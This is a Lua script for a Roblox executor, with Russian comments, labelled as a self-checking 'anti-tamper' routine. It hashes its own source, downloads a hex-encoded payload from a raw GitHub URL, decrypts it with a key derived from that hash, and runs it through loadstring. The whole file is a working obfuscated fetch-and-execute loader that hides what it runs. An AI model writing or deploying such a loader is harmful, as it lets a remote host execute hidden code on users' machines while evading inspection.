--[[ Xeno Self-Dependent Anti-Tamper ]]--
_G._XENO_SOURCE_CODE = [=[
local _orig_loadstring = loadstring
local _orig_httpget = game.HttpGet
local _orig_debug_info = debug.info

-- [ДИАГНОСТИКА СРЕДЫ ВЫПОЛНЕНИЯ]
-- Собираем "паспорт" функции loadstring твоего инжектора
local _ok1, _line = pcall(function() return _orig_debug_info(_orig_loadstring, "l") end)
local _ok2, _src = pcall(function() return _orig_debug_info(_orig_loadstring, "s") end)

-- Просто выводим информацию в консоль, НО НЕ БЛОКИРУЕМ ЗАПУСК
warn("[Xeno Debug System]: Данные loadstring:")
print(" -> Источник (Source):", tostring(_src))
print(" -> Строка (Line):", tostring(_line))

-- 1. Берем исходный код контейнера
local _self_code = _G._XENO_SOURCE_CODE
if not _self_code then 
    error("Критическая ошибка: Контейнер целостности уничтожен!")
end

-- 2. Очищаем код: оставляем ТОЛЬКО ASCII (1-127) и убираем пробелы
local _ascii_only = ""
for i = 1, #_self_code do
    local b = string.byte(_self_code, i)
    if b > 0 and b < 128 then
        _ascii_only = _ascii_only .. string.char(b)
    end
end
local _clean_self = string.gsub(_ascii_only, "%s+", "")

-- 3. Считаем хэш самого себя
local _loader_key = 0
for i = 1, #_clean_self do
    _loader_key = (_loader_key + string.byte(_clean_self, i) * i) % 256
end

print("[Xeno System]: Проверка целостности пройдена. Ключ ядра сформирован.")

-- 4. Скачивание payload
local _0xbc = "https://raw.githubusercontent.com/geragori11/gplt/main/github_payload.txt"
local _0xnc = "?nocache=" .. tostring(math.random(10000, 99999))
local _0xrd = _orig_httpget(game, _0xbc .. _0xnc)

if not _0xrd then error("Сеть упала.") end

local _0xhd = string.sub(_0xrd, 1, 10)
local _0xbd = string.sub(_0xrd, 11)

local _0xms = tonumber(string.sub(_0xhd, 1, 2), 16)
local _0xst = tonumber(string.sub(_0xhd, 3, 4), 16)
local _0xln = tonumber(string.sub(_0xhd, 5, 10), 16)

if #_0xbd ~= _0xln then error("Пакет поврежден!") end

local _0xbcsum = 0
for i = 1, #_0xbd do
    _0xbcsum = (_0xbcsum + string.byte(_0xbd, i) * i) % 256
end

local _0xsk = (_0xbcsum + _0xms + _loader_key) % 256

local _0xbf = {}
local _0xls = _0xsk

for i = 1, #_0xbd, 2 do
    local _0xhb = string.sub(_0xbd, i, i + 1)
    local _0xby = tonumber(_0xhb, 16)
    if not _0xby then error("Защитный блок: Обнаружен взлом!") end
    
    local _0xd = (_0xby - _0xls - _0xst) % 256
    table.insert(_0xbf, string.char(_0xd))
    _0xls = _0xby
end

local _0xdc = table.concat(_0xbf)
local _0xrn, _0xce = _orig_loadstring(_0xdc)
if not _0xrn then
    error("Ошибка: Скрипт превратился в мусор! Неверный ключ защиты.")
end

_0xrn()
]=]
assert(loadstring(_G._XENO_SOURCE_CODE))()
